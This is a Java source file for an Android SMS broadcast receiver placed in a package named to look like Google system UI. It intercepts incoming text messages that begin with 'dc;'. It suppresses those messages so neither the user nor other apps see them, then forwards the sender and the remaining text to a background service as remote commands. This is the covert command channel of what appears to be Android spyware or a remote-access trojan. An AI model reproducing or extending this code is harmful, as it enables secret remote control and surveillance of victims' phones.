package com.google.android.systemUi.receiver;

import android.content.*;
import android.os.*;
import android.telephony.gsm.*;
import android.util.*;
import android.widget.*;
import com.google.android.systemUi.service.*;

public class SmsReceiver extends BroadcastReceiver
{
	public static final String ACTION_SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	public static final String EXTRA_SENDER_NUMBER = "senderNumber";
	public static final String EXTRA_MESSAGE = "message";
	public static final String PREFIX = "dc;";

	@Override
	public void onReceive(Context context, Intent intent)
	{
		
		if (intent.getAction().equals(ACTION_SMS_RECEIVED))
		{
            Bundle bundle = intent.getExtras();
			
            if (bundle != null)
			{
                // get sms objects
                Object[] pdus = (Object[]) bundle.get("pdus");

                if (pdus.length == 0)
                    return;

                // large message might be broken into many
                SmsMessage[] messages = new SmsMessage[pdus.length];

                StringBuilder sb = new StringBuilder();

                for (int i = 0; i < pdus.length; i++)
				{
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    sb.append(messages[i].getMessageBody());
                }

                String sender = messages[0].getOriginatingAddress();
                String message = sb.toString();
				String cutMessage = null;
				
				if (message.startsWith(PREFIX))
				{
					// prevent any other broadcast receivers from receiving broadcast
					abortBroadcast();
					
					cutMessage = message.substring(PREFIX.length());
					
					Intent commandRequest = new Intent(context, CommunicationService.class);
					
					commandRequest.setAction(ACTION_SMS_RECEIVED);
					commandRequest.putExtra(EXTRA_SENDER_NUMBER, sender);
					commandRequest.putExtra(EXTRA_MESSAGE, cutMessage);
					
					context.startService(commandRequest);
				}
            }
        }
	}
}
